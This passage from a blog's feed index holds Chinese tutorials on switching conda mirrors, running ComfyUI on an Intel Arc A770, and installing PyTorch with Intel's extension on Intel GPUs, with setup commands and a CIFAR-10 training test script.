variable">-i</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>4. 测试新的源：</strong></p><p>创建一个新的 Conda 环境，并安装一个包，以验证新的源是否生效：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">conda create <span class="token parameter variable">-n</span> test_env numpy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果安装过程顺利且速度较快，则说明源更换成功。</p><p><strong>注意事项：</strong></p><ul><li><strong>备份原始配置：</strong> 在更改 <code>.condarc</code> 文件之前，建议备份原始配置，以防需要恢复。</li><li><strong>恢复默认源：</strong> 如果需要恢复默认源，可以删除 <code>.condarc</code> 文件，或者执行以下命令：</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">conda config --remove-key channels<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通过以上步骤，您可以成功将 Conda 的源更换为国内镜像源，从而提高包的下载速度和稳定性。</p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> conda </tag>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ArcA770使用comfyui教程</title>
      <link href="/2025/02/18/arca770-shi-yong-comfyui-jiao-cheng/"/>
      <url>/2025/02/18/arca770-shi-yong-comfyui-jiao-cheng/</url>
      
        <content type="html"><![CDATA[<h1 id="ArcA770使用comfyui教程"><a href="#ArcA770使用comfyui教程" class="headerlink" title="ArcA770使用comfyui教程"></a>ArcA770使用comfyui教程</h1><h3 id="1-前置配置"><a href="#1-前置配置" class="headerlink" title="1. 前置配置"></a><strong>1. 前置配置</strong></h3><ul><li>conda</li><li>更新驱动</li><li>安装<strong>Visual Studio Build Tools</strong></li><li>安装oneAPI</li><li>安装IPEX</li><li>具体看链接<a href="https://0xdadream.github.io/2025/02/18/intel-xian-qia-pao-ai-pei-zhi-jiao-cheng/">Intel显卡运行AI配置教程 | 逐梦</a></li></ul><hr><h3 id="2-配置Python"><a href="#2-配置Python" class="headerlink" title="2. 配置Python"></a><strong>2. 配置Python</strong></h3><ul><li><p><strong>Python环境</strong>：<br>建议使用<strong>Python 3.10或更高版本</strong>，并通过虚拟环境（如<code>venv</code>或<code>conda</code>）隔离依赖。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">conda create <span class="token parameter variable">-n</span> comfyui <span class="token assign-left variable">python</span><span class="token operator">=</span><span class="token number">3.11</span>  这里comfyui就是安装IPEX的环境conda activate comfyui<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul><hr><h3 id="3-安装ComfyUI及依赖库"><a href="#3-安装ComfyUI及依赖库" class="headerlink" title="3. 安装ComfyUI及依赖库"></a><strong>3. 安装ComfyUI及依赖库</strong></h3><ul><li><p><strong>克隆ComfyUI仓库</strong>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> xxxx <span class="token comment">#工作目录</span><span class="token function">git</span> clone https://github.com/comfyanonymous/ComfyUI.git<span class="token builtin class-name">cd</span> ComfyUIpip <span class="token function">install</span> <span class="token parameter variable">-r</span> requirements.txt <span class="token comment"># 安装依赖</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul><hr><h3 id="4-验证显卡识别与性能调优"><a href="#4-验证显卡识别与性能调优" class="headerlink" title="4. 验证显卡识别与性能调优"></a><strong>4. 验证显卡识别与性能调优</strong></h3><ul><li><strong>显存与算力优化</strong>：<ul><li>启用Intel的<strong>XMX引擎</strong>（AI加速单元）和<strong>XeSS技术</strong>（超分辨率），可通过设置环境变量优化显存分配410。</li><li>调整ComfyUI配置文件，指定使用<code>XPU</code>（Intel GPU）而非默认的CUDA。</li></ul></li></ul><hr><h3 id="5-启动comfyui"><a href="#5-启动comfyui" class="headerlink" title="5.启动comfyui"></a><strong>5.启动comfyui</strong></h3><p>接着上面的目录执行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python main.py --use-pytorch-cross-attention <span class="token parameter variable">--highvram</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="快捷脚本"><a href="#快捷脚本" class="headerlink" title="快捷脚本"></a>快捷脚本</h4><h5 id="cmd"><a href="#cmd" class="headerlink" title="cmd"></a>cmd</h5><pre class="line-numbers language-bat" data-language="bat"><code class="language-bat">call "E:\conda\Scripts\activate.bat" deepl  call "C:\Program Files (x86)\Intel\oneAPI\setvars.bat"python main.py --use-pytorch-cross-attention --highvram<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>保存为<code>.bat</code>文件</p><p>powershell</p><p>没搞出来</p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
          <category> 深度学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> intel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Intel显卡运行AI配置教程</title>
      <link href="/2025/02/18/intel-xian-qia-pao-ai-pei-zhi-jiao-cheng/"/>
      <url>/2025/02/18/intel-xian-qia-pao-ai-pei-zhi-jiao-cheng/</url>
      
        <content type="html"><![CDATA[<h1 id="Intel显卡运行AI配置教程"><a href="#Intel显卡运行AI配置教程" class="headerlink" title="Intel显卡运行AI配置教程"></a><strong>Intel显卡运行AI配置教程</strong></h1><h2 id="最新"><a href="#最新" class="headerlink" title="最新"></a>最新</h2><p>最近pytorch已经支持Arc显卡了，不需要再安装oneAPI和IPEX，当然以前的版本仍需要（2.5及以前），但是我本地本来是安装过这些组件的，我也不知道不安装会不会报错，可以参考官方文档<a href="https://www.intel.com/content/www/us/en/developer/articles/tool/pytorch-prerequisites-for-intel-gpu/2-6.html">PyTorch Prerequisites for Intel® GPUs</a>，pytorch开发者确实说过免去了那些复杂的操作，可以开箱即用</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>直接在conda环境中执行即可</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">conda activate deeplpip3 <span class="token function">install</span> <span class="token parameter variable">--pre</span> torch torchvision torchaudio --index-url https://download.pytorch.org/whl/nightly/xpu<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>输出true就是成功了</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> torchtorch<span class="token punctuation">.</span>xpu<span class="token punctuation">.</span>is_available<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># torch.xpu is the API for Intel GPU support</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>训练测试代码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> torch<span class="token keyword">import</span> torchvisionLR <span class="token operator">=</span> <span class="token number">0.001</span>DOWNLOAD <span class="token operator">=</span> <span class="token boolean">True</span>DATA <span class="token operator">=</span> <span class="token string">"datasets/cifar10/"</span>transform <span class="token operator">=</span> torchvision<span class="token punctuation">.</span>transforms<span class="token punctuation">.</span>Compose<span class="token punctuation">(</span>    <span class="token punctuation">[</span>        torchvision<span class="token punctuation">.</span>transforms<span class="token punctuation">.</span>Resize<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">224</span><span class="token punctuation">,</span> <span class="token number">224</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        torchvision<span class="token punctuation">.</span>transforms<span class="token punctuation">.</span>ToTensor<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        torchvision<span class="token punctuation">.</span>transforms<span class="token punctuation">.</span>Normalize<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">,</span> <span class="token number">0.5</span><span class="token punctuation">,</span> <span class="token number">0.5</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">,</span> <span class="token number">0.5</span><span class="token punctuation">,</span> <span class="token number">0.5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">]</span><span class="token punctuation">)</span>train_dataset <span class="token operator">=</span> torchvision<span class="token punctuation">.</span>datasets<span class="token punctuation">.</span>CIFAR10<span class="token punctuation">(</span>    root<span class="token operator">=</span>DATA<span class="token punctuation">,</span>    train<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>    transform<span class="token operator">=</span>transform<span class="token punctuation">,</span>    download<span class="token operator">=</span>DOWNLOAD<span class="token punctuation">,</span><span class="token punctuation">)</span>train_loader <span class="token operator">=</span> torch<span class="token punctuation">.</span>utils<span class="token punctuation">.</span>data<span class="token punctuation">.</span>DataLoader<span class="token punctuation">(</span>dataset<span class="token operator">=</span>train_dataset<span class="token punctuation">,</span> batch_size<span class="token operator">=</span><span class="token number">128</span><span class="token punctuation">)</span>train_len <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>train_loader<span class="token punctuation">)</span>model <span class="token operator">=</span> torchvision<span class="token punctuation">.</span>models<span class="token punctuation">.</span>resnet50<span class="token punctuation">(</span><span class="token punctuation">)</span>criterion <span class="token operator">=</span> torch<span class="token punctuation">.</span>nn<span class="token punctuation">.</span>CrossEntropyLoss<span class="token punctuation">(</span><span class="token punctuation">)</span>optimizer <span class="token operator">=</span> torch<span class="token punctuation">.</span>optim<span class="token punctuation">.</span>SGD<span class="token punctuation">(</span>model<span class="token punctuation">.</span>parameters<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> lr<span class="token operator">=</span>LR<span class="token punctuation">,</span> momentum<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">)</span>model<span class="token punctuation">.</span>train<span class="token punctuation">(</span><span class="token punctuation">)</span>model <span class="token operator">=</span> model<span class="token punctuation">.</span>to<span class="token punctuation">(</span><span class="token string">"xpu"</span><span class="token punctuation">)</span>criterion <span class="token operator">=</span> criterion<span class="token punctuation">.</span>to<span class="token punctuation">(</span><span class="token string">"xpu"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Initiating training"</span></span><span class="token punctuation">)</span><span class="token keyword">for</span> batch_idx<span class="token punctuation">,</span> <span class="token punctuation">(</span>data<span class="token punctuation">,</span> target<span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>train_loader<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> data<span class="token punctuation">.</span>to<span class="token punctuation">(</span><span class="token string">"xpu"</span><span class="token punctuation">)</span>    target <span class="token operator">=</span> target<span class="token punctuation">.</span>to<span class="token punctuation">(</span><span class="token string">"xpu"</span><span class="token punctuation">)</span>    optimizer<span class="token punctuation">.</span>zero_grad<span class="token punctuation">(</span><span class="token punctuation">)</span>    output <span class="token operator">=</span> model<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    loss <span class="token operator">=</span> criterion<span class="token punctuation">(</span>output<span class="token punctuation">,</span> target<span class="token punctuation">)</span>    loss<span class="token punctuation">.</span>backward<span class="token punctuation">(</span><span class="token punctuation">)</span>    optimizer<span class="token punctuation">.</span>step<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>batch_idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">10</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>         iteration_loss <span class="token operator">=</span> loss<span class="token punctuation">.</span>item<span class="token punctuation">(</span><span class="token punctuation">)</span>         <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Iteration [</span><span class="token interpolation"><span class="token punctuation">{</span>batch_idx<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">}</span></span><span class="token string">/</span><span class="token interpolation"><span class="token punctuation">{</span>train_len<span class="token punctuation">}</span></span><span class="token string">], Loss: </span><span class="token interpolation"><span class="token punctuation">{</span>iteration_loss<span class="token punctuation">:</span><span class="token format-spec">.4f</span><span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>torch<span class="token punctuation">.</span>save<span class="token punctuation">(</span>    <span class="token punctuation">{</span>        <span class="token string">"model_state_dict"</span><span class="token punctuation">:</span> model<span class="token punctuation">.</span>state_dict<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token string">"optimizer_state_dict"</span><span class="token punctuation">:</span> optimizer<span class="token punctuation">.</span>state_dict<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token string">"checkpoint.pth"</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Execution finished"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>适用硬件</strong></p><ul><li>Intel Arc系列显卡（如A770 16G）驱动为6559</li><li>win11</li><li>oneAPI==2025.0.1</li><li>torch==2.3.110</li></ul><hr><h2 id="1-安装Miniconda并配置Python虚拟环境"><a href="#1-安装Miniconda并配置Python虚拟环境" class="headerlink" title="1. 安装Miniconda并配置Python虚拟环境"></a><strong>1. 安装Miniconda并配置Python虚拟环境</strong></h2><p>可以参考这个<a href="https://0xdadream.github.io/2024/08/12/conda-an-zhuang-ji-shi-yong/">conda安装及使用 | 逐梦</a></p><h3 id="步骤说明"><a href="#步骤说明" class="headerlink" title="步骤说明"></a><strong>步骤说明</strong></h3><ol><li><p><strong>下载Miniconda</strong></p><ul><li>访问 <a href="https://docs.conda.io/en/latest/miniconda.html">Miniconda官网</a>，选择对应操作系统的安装包（建议Python 3.11版本）。</li></ul></li><li><p><strong>安装Miniconda</strong></p><ul><li><p>Windows：双击安装包，按提示操作，勾选“Add to PATH”选项。</p></li><li><p>Linux/macOS：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">bash</span> Miniconda3-latest-Linux-x86_64.sh  <span class="token comment"># 根据文件名调整  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul></li><li><p><strong>创建Python 3.11虚拟环境</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">conda create <span class="token parameter variable">-n</span> intel-ai <span class="token assign-left variable">python</span><span class="token operator">=</span><span class="token number">3.11</span>  conda activate intel-ai  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol><hr><h2 id="2-更新Intel显卡驱动"><a href="#2-更新Intel显卡驱动" class="headerlink" title="2. 更新Intel显卡驱动"></a><strong>2. 更新Intel显卡驱动</strong></h2><h3 id="关键操作"><a href="#关键操作" class="headerlink" title="关键操作"></a><strong>关键操作</strong></h3><ol><li><p><strong>下载最新驱动</strong></p><ul><li>访问 <a href="https://www.intel.cn/content/www/cn/zh/download-center/home.html">Intel驱动下载页</a>，选择Arc系列显卡的最新驱动（如<strong>32.0.101.6559</strong>）。</li></ul></li><li><p><strong>安装驱动</strong></p><ul><li><p>Windows：运行安装程序，按提示完成安装。</p></li><li><p>Linux：使用包管理器（如Ubuntu/Debian）：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> intel-opencl-icd intel-level-zero-gpu level-zero  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul></li><li><p><strong>验证驱动状态</strong></p><ul><li><p>Windows：按 <code>Win + X</code> &gt; 设备管理器 &gt; 显示适配器，确认显卡型号正确。</p></li><li><p>Linux：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">lspci <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-i</span> intel  <span class="token comment"># 确认显卡识别  </span>clinfo  <span class="token comment"># 检查OpenCL支持  </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul></li></ol><hr><h2 id="3-安装Visual-Studio-Build-Tools（仅Windows）"><a href="#3-安装Visual-Studio-Build-Tools（仅Windows）" class="headerlink" title="3. 安装Visual Studio Build Tools（仅Windows）"></a><strong>3. 安装Visual Studio Build Tools（仅Windows）</strong></h2><h3 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a><strong>操作步骤</strong></h3><ol><li><strong>下载Visual Studio 2022</strong><ul><li>访问 <a href="https://visualstudio.microsoft.com/">Visual Studio官网</a>，下载社区版。</li></ul></li><li><strong>安装C++桌面开发组件</strong><ul><li>在安装界面勾选：<ul><li><strong>使用C++的桌面开发</strong></li><li><strong>Windows 10/11 SDK</strong></li><li><strong>C++ CMake工具</strong></li><li>默认也行</li></ul></li></ul></li><li><strong>验证安装</strong><ul><li>打开命令提示符，运行 <code>cl</code> 命令，确认返回编译器版本信息。</li></ul></li></ol><hr><h2 id="4-安装Intel-oneAPI工具包"><a href="#4-安装Intel-oneAPI工具包" class="headerlink" title="4. 安装Intel oneAPI工具包"></a><strong>4. 安装Intel oneAPI工具包</strong></h2><h3 id="步骤说明-1"><a href="#步骤说明-1" class="headerlink" title="步骤说明"></a><strong>步骤说明</strong></h3><ol><li><p><strong>下载oneAPI Base Toolkit</strong></p><ul><li>访问 <a href="https://www.intel.cn/content/www/cn/zh/developer/tools/oneapi/toolkits.html">oneAPI官网</a>，选择Base Toolkit-&gt;windows-&gt;offline installer，然后点击右边往下一点Continue as a Guest (download starts immediately) →下载</li></ul></li><li><p><strong>安装oneAPI</strong></p><ul><li>Windows：运行安装程序，默认勾选所有组件，一直点就行了。</li><li>Linux：使用包管理器或脚本安装。</li></ul></li><li><p><strong>激活oneAPI环境变量</strong></p><ul><li><p>Windows：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">call <span class="token string">"C:\Program Files (x86)\Intel\oneAPI\setvars.bat"</span>   <span class="token comment"># cmd使用</span>cmd.exe <span class="token string">"/K"</span> <span class="token string">'"C:\Program Files (x86)\Intel\oneAPI\setvars.bat" &amp;&amp; powershell'</span> <span class="token comment"># powershell使用</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>Linux：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">source</span> /opt/intel/oneapi/setvars.sh  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul></li></ol><hr><h2 id="5-安装Intel-Extension-for-PyTorch-IPEX"><a href="#5-安装Intel-Extension-for-PyTorch-IPEX" class="headerlink" title="5. 安装Intel Extension for PyTorch (IPEX)"></a><strong>5. 安装Intel Extension for PyTorch (IPEX)</strong></h2><h3 id="操作命令"><a href="#操作命令" class="headerlink" title="操作命令"></a><strong>操作命令</strong></h3><ol><li><p><strong>激活虚拟环境与oneAPI</strong></p><p>powershell中执行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> xxx <span class="token comment">#最好切换到工作目录</span>conda create <span class="token parameter variable">-n</span> intel-ai <span class="token assign-left variable">python</span><span class="token operator">=</span><span class="token number">3.11</span>  <span class="token comment"># 前面创建过环境没有再次创建</span>conda activate intel-ai <span class="token comment"># 激活环境 </span>conda <span class="token function">install</span> libjepg-turbo <span class="token comment">#提前安装这两个库以免报错</span>conda <span class="token function">install</span> libpng cmd.exe <span class="token string">"/K"</span> <span class="token string">'"C:\Program Files (x86)\Intel\oneAPI\setvars.bat" &amp;&amp; powershell'</span>  <span class="token comment"># 根据操作系统执行上述对应的oneAPI激活命令</span>conda activate intel-ai <span class="token comment"># 再次激活环境</span>conda <span class="token function">install</span> pkg-config libuv <span class="token comment"># 安装一些依赖</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>安装PyTorch与IPEX</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 安装PyTorch CPU版本（IPEX会自动启用GPU支持）  </span>pip <span class="token function">install</span> <span class="token assign-left variable">torch</span><span class="token operator">==</span><span class="token number">2.3</span>.1.post0+cxx11.abi <span class="token assign-left variable">torchvision</span><span class="token operator">==</span><span class="token number">0.18</span>.1.post0+cxx11.abi <span class="token assign-left variable">torchaudio</span><span class="token operator">==</span><span class="token number">2.3</span>.1.post0+cxx11.abi intel-extension-for-pytorch<span class="token operator">==</span><span class="token number">2.3</span>.110.post0+xpu --extra-index-url https://pytorch-extension.intel.com/release-whl/stable/xpu/cn/ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip <span class="token function">install</span> <span class="token assign-left variable">torch</span><span class="token operator">==</span><span class="token number">2.5</span>.1+cxx11.abi <span class="token assign-left variable">torchvision</span><span class="token operator">==</span><span class="token number">0.20</span>.1+cxx11.abi <span class="token assign-left variable">torchaudio</span><span class="token operator">==</span><span class="token number">2.5</span>.1+cxx11.abi intel-extension-for-pytorch<span class="token operator">==</span><span class="token number">2.5</span>.10+xpu --extra-index-url https://pytorch-extension.intel.com/release-whl/stable/xpu/cn/<span class="token comment"># 最新版实测也能用</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol><hr><h2 id="6-验证IPEX安装与显卡识别"><a href="#6-验证IPEX安装与显卡识别" class="headerlink" title="6. 验证IPEX安装与显卡识别"></a><strong>6. 验证IPEX安装与显卡识别</strong></h2><h3 id="验证步骤"><a href="#验证步骤" class="headerlink" title="验证步骤"></a><strong>验证步骤</strong></h3><ol><li><p><strong>运行Python脚本检查GPU支持</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> torch  <span class="token keyword">import</span> intel_extension_for_pytorch <span class="token keyword">as</span> ipex  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"PyTorch版本: </span><span class="token interpolation"><span class="token punctuation">{</span>torch<span class="token punctuation">.</span>__version__<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"IPEX版本: </span><span class="token interpolation"><span class="token punctuation">{</span>ipex<span class="token punctuation">.</span>__version__<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Intel GPU是否可用: </span><span class="token interpolation"><span class="token punctuation">{</span>torch<span class="token punctuation">.</span>xpu<span class="token punctuation">.</span>is_available<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"检测到的Intel GPU设备: </span><span class="token interpolation"><span class="token punctuation">{</span>torch<span class="token punctuation">.</span>xpu<span class="token punctuation">.</span>get_device_name<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python <span class="token parameter variable">-c</span> <span class="token string">"import torch; import intel_extension_for_pytorch as ipex; print('PyTorch版本:', torch.__version__); print('IPEX版本:', ipex.__version__); print('Intel GPU是否可用:', torch.xpu.is_available()); print('检测到的Intel GPU设备:', torch.xpu.get_device_name(0))"</span><span class="token comment"># 一键脚本</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>预期输出</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">PyTorch版本: <span class="token number">2.1</span>.0  IPEX版本: <span class="token number">2.1</span>.0  Intel GPU是否可用: True  检测到的Intel GPU设备: Intel<span class="token punctuation">(</span>R<span class="token punctuation">)</span> Arc<span class="token punctuation">(</span>TM<span class="token punctuation">)</span> A770 Graphics  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>官方脚本</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python <span class="token parameter variable">-c</span> <span class="token string">"import torch; import intel_extension_for_pytorch as ipex; print(torch.__version__); print(ipex.__version__); [print(f'[{i}]: {torch.xpu.get_device_properties(i)}') for i in range(torch.xpu.device_count())];"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>至此已经安装成功了</p></li></ol><hr><h2 id="7-常见问题解决"><a href="#7-常见问题解决" class="headerlink" title="7. 常见问题解决"></a><strong>7. 常见问题解决</strong></h2><p>遇到问题大多数时候都是各种版本不匹配，例如<code>raise err OSError: [WinError 126] 找不到指定的模块。</code>，尽量使用教程相同版本。</p><p>报错信息</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">E:<span class="token punctuation">\</span>conda<span class="token punctuation">\</span>envs<span class="token punctuation">\</span>deepll<span class="token punctuation">\</span>Lib<span class="token punctuation">\</span>site-packages<span class="token punctuation">\</span>torchvision<span class="token punctuation">\</span>io<span class="token punctuation">\</span>image.py:14: UserWarning: Failed to load image Python extension: <span class="token string">'Could not find module '</span>E:<span class="token punctuation">\</span>conda<span class="token punctuation">\</span>envs<span class="token punctuation">\</span>deepll<span class="token punctuation">\</span>Lib<span class="token punctuation">\</span>site-packages<span class="token punctuation">\</span>torchvision<span class="token punctuation">\</span>image.pyd<span class="token string">' (or one of its dependencies). Try using the full path with constructor syntax.'</span>If you don't plan on using image functionality from <span class="token variable"><span class="token variable">`</span>torchvision.io<span class="token variable">`</span></span>, you can ignore this warning. Otherwise, there might be something wrong with your environment. Did you have <span class="token variable"><span class="token variable">`</span>libjpeg<span class="token variable">`</span></span> or <span class="token variable"><span class="token variable">`</span>libpng<span class="token variable">`</span></span> installed before building <span class="token variable"><span class="token variable">`</span>torchvision<span class="token variable">`</span></span> from source?  warn<span class="token punctuation">(</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>解决方案</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">conda activate deepl <span class="token comment"># 激活对应环境</span>conda <span class="token function">install</span> libjepg-turboconda <span class="token function">install</span> libpng<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>若有其他缺少库报错，安装对应库即可，可以参考文章<a href="https://0xdadream.github.io/2025/02/18/python-ku-bao-cuo-hui-zong/">python库报错汇总 | 逐梦</a></p><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h2><p>通过本教程，你已成功配置Intel显卡的AI开发环境，并验证了IPEX的GPU加速支持。接下来可尝试运行AI模型（如Stable Diffusion、LLM推理），并通过环境变量 <code>LIBOMPTARGET_PLUGIN=LEVEL0</code> 或 <code>SYCL_CACHE_PERSISTENT=1</code> 进一步优化性能。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.intel.com/content/www/us/en/developer/tools/oneapi/base-toolkit-download.html">获取英特尔® oneAPI Base Toolkit</a></p><p><a href="https://intel.github.io/intel-extension-for-pytorch/">Welcome to Intel® Extension for PyTorch* Documentation!</a></p><p><a href="https://www.bilibili.com/video/BV1dKaMeXE3B/?vd_source=b809bacd004cf290c08f612fa076f2eb">intel arc 显卡 ComfyUI 安装教程_哔哩哔哩_bilibili</a></p><p><a href="https://blog.csdn.net/yunying985/article/details/140589680">AI绘画 | 只要10步让你在英特尔A770显卡下安装ComfyUI运行StableDiffusion3最新开源模型_arc a750 安装comfyui-CSDN博客</a></p><p><a href="https://pytorch.org/docs/main/notes/get_start_xpu.html">Getting Started on Intel GPU — PyTorch main documentation</a></p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
          <category> 深度学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> intel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python库报错汇总</title>
      <link href="/2025/02/18/python-ku-bao-cuo-hui-zong/"/>
      <url>/2025/02/18/python-ku-bao-cuo-hui-zong/</url>
      
